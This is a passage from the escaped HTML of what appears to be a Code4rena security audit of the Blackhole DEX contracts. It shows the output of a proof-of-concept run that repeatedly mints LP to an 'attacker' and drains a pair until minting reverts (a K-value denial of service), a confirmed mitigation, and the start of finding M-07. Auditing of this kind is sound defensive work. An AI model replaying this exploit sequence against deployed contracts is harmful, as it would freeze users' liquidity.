class=\"mtk7\"\u003e156250187500093750025000003750000300000009999000\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ePair\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e TotalSupply: \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e156250187500093750025000003750000300000010000000\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e  \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eCalled\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003edrainPair\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e  \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ePair\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eDAI\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ebalance\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eafter\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e drain: \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e1\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e  \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ePair\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eFRAX\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ebalance\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eafter\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e drain: \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e2\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk12\"\u003eCycle\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e8\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e/\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e11\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e  \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eTransferred\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e10000000\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk4\"\u003eof\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eDAI\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eand\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eFRAX\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eto\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epair\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e  \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eMinted\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eLP\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e. \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eAttacker\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eLP\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e Balance: \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e781251093750656250218750043750005250000350000009999000\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ePair\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e TotalSupply: \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e781251093750656250218750043750005250000350000010000000\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e  \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eCalled\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003edrainPair\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e  \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ePair\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eDAI\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ebalance\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eafter\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e drain: \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e1\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e  \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ePair\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eFRAX\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ebalance\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eafter\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e drain: \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e2\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk12\"\u003eCycle\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e9\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e/\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e11\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e  \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eTransferred\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e10000000\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk4\"\u003eof\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eDAI\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eand\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eFRAX\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eto\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epair\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e  \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eMinted\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eLP\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e. \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eAttacker\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eLP\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e Balance: \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e3906256250004375001750000437500070000007000000400000009999000\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ePair\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e TotalSupply: \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e3906256250004375001750000437500070000007000000400000010000000\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e  \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eCalled\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003edrainPair\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e  \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ePair\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eDAI\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ebalance\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eafter\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e drain: \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e1\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e  \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ePair\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eFRAX\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ebalance\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eafter\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e drain: \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e2\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk12\"\u003eCycle\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e10\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e/\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e11\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e  \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eTransferred\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e10000000\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk4\"\u003eof\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eDAI\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eand\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eFRAX\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eto\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epair\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e  \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eMinted\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eLP\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e. \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eAttacker\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eLP\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e Balance: \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e19531285156278125013125003937500787500105000009000000450000009999000\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ePair\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e TotalSupply: \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e19531285156278125013125003937500787500105000009000000450000010000000\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e  \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eCalled\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003edrainPair\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e  \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ePair\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eDAI\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ebalance\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eafter\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e drain: \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e1\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e  \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ePair\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eFRAX\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ebalance\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eafter\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e drain: \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e2\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk12\"\u003eCycle\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e11\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e/\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e11\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e  \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eTransferred\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e10000000\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk4\"\u003eof\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eDAI\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eand\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eFRAX\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eto\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epair\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e  \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eMinted\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eLP\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e. \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eAttacker\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eLP\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e Balance: \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e97656445312675781343750032812507875001312500150000011250000500000009999000\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ePair\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e TotalSupply: \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e97656445312675781343750032812507875001312500150000011250000500000010000000\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e  \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eCalled\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003edrainPair\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e  \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ePair\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eDAI\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ebalance\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eafter\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e drain: \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e1\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e  \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ePair\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eFRAX\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ebalance\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eafter\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e drain: \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e2\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk12\"\u003eAttempting\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003efinal\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003emint\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ewhich\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eshould\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003efail\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e...\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk12\"\u003eTest\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e finished: \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eSuccessfully\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003edemonstrated\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003evulnerability\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eand\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003efinal\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003emint\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ereverted\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    ✔ \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eshould\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003edemonstrate\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ethe\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eK\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003evalue\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003evulnerability\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eleading\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eto\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eDOS\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (1262\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ems\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e)\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003c/details\u003e\n\u003cp\u003e\u003cstrong\u003e\u003ca href=\"https://github.com/code-423n4/2025-06-blackhole-mitigation?tab=readme-ov-file#mitigation-of-high--medium-severity-issues\"\u003eBlackhole mitigated\u003c/a\u003e\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eStatus:\u003c/strong\u003e Mitigation confirmed. Full details in reports from \u003ca href=\"https://code4rena.com/audits/2025-06-blackhole-mitigation-review/submissions/S-60\"\u003emaxvzuvex\u003c/a\u003e and \u003ca href=\"https://code4rena.com/audits/2025-06-blackhole-mitigation-review/submissions/S-49\"\u003erayss\u003c/a\u003e.\u003c/p\u003e\n\u003cp\u003eThe sponsor team requested that the following note be included: \u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp\u003eThis issue originates from the upstream codebase, inherited from ThenaV2 fork. Given that ThenaV2 has successfully operated at scale for several months without incident, we assess the severity of this issue as low. The implementation has been effectively battle-tested in a production environment, which significantly reduces the practical risk associated with this finding.\nReference: \u003ca href=\"https://github.com/ThenafiBNB/THENA-Contracts/blob/main/contracts/Pair.sol#L344\"\u003ehttps://github.com/ThenafiBNB/THENA-Contracts/blob/main/contracts/Pair.sol#L344\u003c/a\u003e\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003chr\u003e\n\u003ch2 id=\"m-07-isgenesisflag-is-ineffective-to-control-add-liquidity-flow-in-routerv2addliquidity\" style=\"position:relative;\"\u003e\u003ca href=\"#m-07-isgenesisflag-is-ineffective-to-control-add-liquidity-flow-in-routerv2addliquidity\" aria-label=\"m 07 isgenesisflag is ineffective to control add liquidity flow in routerv2addliquidity permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003ca href=\"https://code4rena.com/audits/2025-05-blackhole/submissions/F-168\"\u003e[M-07] \u003ccode\u003eisGenesis\u003c/code\u003e flag is ineffective to control add liquidity flow in \u003ccode\u003eRouterV2.addLiquidity()\u003c/code\u003e\u003c/a\u003e\u003c/h2\u003e\n\u003cp\u003e\u003cem\u003eSubmitted by \u003ca href=\"https://code4rena.com/audits/2025-05-blackhole/submissions/S-279\"\u003emaxzuvex\u003c/a\u003e\u003c/em\u003e\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://github.com/code-423n4/2025-05-blackhole/blob/92fff849d3b266e609e6d63478c4164d9f608e91/contracts/RouterV2.sol#L384\"\u003ehttps://github.com/code-423n4/2025-05-blackhole/blob/92fff849d3b266e609e6d63478c4164d9f608e91/contracts/RouterV2.sol#L384\u003c/a\u003e\u003c/p\u003e\n\u003ch3 id=\"finding-description-5\" style=\"position:relative;\"\u003e\u003ca href=\"#finding-description-5\" aria-label=\"finding description 5 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 